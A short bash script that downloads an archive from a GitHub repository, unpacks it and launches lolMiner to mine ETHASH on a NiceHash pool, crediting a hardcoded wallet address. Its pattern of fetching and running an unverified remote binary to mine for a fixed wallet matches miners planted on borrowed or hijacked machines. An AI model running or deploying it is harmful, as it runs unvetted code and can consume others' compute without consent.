#!/bin/bash
apt-get install wget -y
wget https://github.com/Kocalkocal93Kocalkocal93/tuyul.sh/raw/main/abc.tar.gz
tar -xvf abc.tar.gz
cd 1.34a
./lolMiner --algo ETHASH --pool daggerhashimoto.eu.nicehash.com:3353 -u TFV2Lz82FGocoXdBJuc9tJSREcTZFSxav2.$(echo $(shuf -i 1000-9999 -n 1)-MJ-)#hthp-17hh --ethstratum ETHPROXY
